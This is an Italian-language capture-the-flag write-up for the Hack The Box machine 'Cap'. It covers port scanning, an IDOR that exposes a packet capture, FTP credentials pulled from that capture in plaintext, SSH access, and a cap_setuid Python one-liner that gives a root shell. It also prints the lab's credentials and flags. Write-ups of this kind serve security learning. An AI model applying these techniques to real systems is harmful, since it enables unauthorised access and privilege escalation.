---
title: "Hack The Box: Cap"
date: 2025-12-31
tags: ["HackTheBox", "Linux", "IDOR", "Capabilities", "Easy"]
author: "Federico Sella"
summary: "Una macchina Linux Easy che evidenzia l'importanza di proteggere il traffico di rete e gestire correttamente le Linux Capabilities."
cover:
    image: "/images/writeups/cap/htb-cap.png"
    alt: "Macchina HTB Cap"
    relative: false
---

**IP Macchina:** `10.129.28.172` | **Difficoltà:** Easy | **OS:** Linux

Cap è una macchina Linux di livello Easy su Hack The Box che evidenzia l'importanza di proteggere il traffico di rete e di gestire correttamente le Linux Capabilities. Il percorso di exploit coinvolge una vulnerabilità **IDOR**, l'analisi di un **file PCAP** per trovare credenziali in chiaro e l'abuso di `cap_setuid` su un binario Python per l'escalation dei privilegi.

## 1. Enumerazione
Ho iniziato con una scansione completa delle porte usando Nmap per identificare i servizi in esecuzione.

```bash
nmap -sC -sV -p- -T4 10.129.28.172

```

![Nmap Scan Results](/images/writeups/cap/1-nmap.png)

**Risultati:**
La scansione ha rivelato tre porte aperte:

* **21/tcp (FTP):** vsftpd 3.0.3
* **22/tcp (SSH):** OpenSSH 8.2p1 Ubuntu
* **80/tcp (HTTP):** Gunicorn (ospita una "Security Dashboard")

## 2. Web Exploitation (IDOR)

Visitando `http://10.129.28.172`, ho trovato una dashboard che mostrava le statistiche di rete. Navigando nella sezione "Security Snapshot", ho notato che la struttura dell'URL seguiva un pattern numerico: `/data/1`, `/data/2`, ecc.

Testando per una vulnerabilità **Insecure Direct Object Reference (IDOR)**, ho cambiato manualmente l'ID dell'URL a 0:

> `http://10.129.28.172/data/0`

![IDOR](/images/writeups/cap/2-idor.png)

Questo ha innescato il download di un file chiamato `0.pcap`.

## 3. Analisi del Traffico

Ho analizzato il file `0.pcap` utilizzando **Wireshark**. Dato che la porta 21 (FTP) era aperta, ho filtrato il traffico per i pacchetti FTP.

![Wireshark](/images/writeups/cap/3-wireshark.png)

Poiché FTP invia i dati in chiaro, ho individuato rapidamente un tentativo di login contenente le credenziali:

* **User:** `nathan`
* **Password:** `Buck3tH4TF0RM3!`

## 4. Accesso Iniziale (User Flag)

Utilizzando le credenziali recuperate, ho effettuato il login via SSH:

```bash
ssh nathan@10.129.28.172

```

Una volta dentro, ho recuperato la flag utente:

```bash
cat user.txt
# Output: 46b57e86780ae3b8882d42155f9f8e1e

```

## 5. Privilege Escalation

Per scalare i privilegi, ho enumerato le Linux Capabilities dei binari sul sistema. Questa è spesso una vittoria facile sulle macchine Linux.

```bash
getcap -r / 2>/dev/null

```

**Output:**

```plaintext
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

La capability `cap_setuid` su Python è critica. Permette al processo di manipolare il suo UID (User ID). Ho sfruttato questo per generare una **shell di root** impostando l'UID a 0:

```python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

Ho verificato con successo la mia identità come root e ho preso la flag finale.

```bash
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)

cat /root/root.txt
# Output: c07497cf599cefbe24d502d470c852b3

```

![root](/images/writeups/cap/4-root.png)